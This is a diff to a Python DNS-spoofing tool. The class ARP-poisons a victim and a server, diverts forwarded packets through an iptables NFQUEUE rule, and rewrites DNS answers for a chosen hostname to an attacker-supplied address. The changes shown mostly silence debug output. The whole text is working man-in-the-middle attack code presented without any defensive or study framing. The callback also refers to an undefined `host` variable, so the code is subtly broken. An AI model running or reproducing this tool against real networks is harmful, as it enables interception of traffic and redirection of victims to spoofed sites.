@@ -8,14 +8,12 @@ from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, Ether
 class Dns_spoof:
 
     def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
-        print('in init')
         self.queue_num = queue_num
         self.ipVictim = ipVictim
         self.ipServer = ipServer
         self.host = host
 
     def __call__(self) -> None:
-        print('in call')
         arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(self.ipVictim, self.ipServer), daemon=True)
         arpThread.start()
 
@@ -23,6 +21,7 @@ class Dns_spoof:
             f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
         self.queue = NetfilterQueue()
         self.queue.bind(self.queue_num, self.call_back)
+        print("DNS spoofing active")
 
         try:
             self.queue.run()
@@ -34,12 +33,12 @@ class Dns_spoof:
     def call_back(self, bin_packet):
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
-            packet.show()
+            #packet.show()
             try:
                 queryName = packet[DNSQR].qname.decode()
                 #if queryName in self.host:
                 if self.host[0] in queryName:
-                    print("Packet in host")
+                    #print("Packet in host")
                     packet[DNS].an = DNSRR(
                         rrname=queryName, rdata=host[1])
                     packet[DNS].ancount = 1
@@ -49,7 +48,7 @@ class Dns_spoof:
                     del packet[UDP].chksum
             except IndexError as error:
                 return False
-            packet.summary()
+            #packet.summary()
             bin_packet.set_payload(bytes(packet))
         return bin_packet.accept()
 
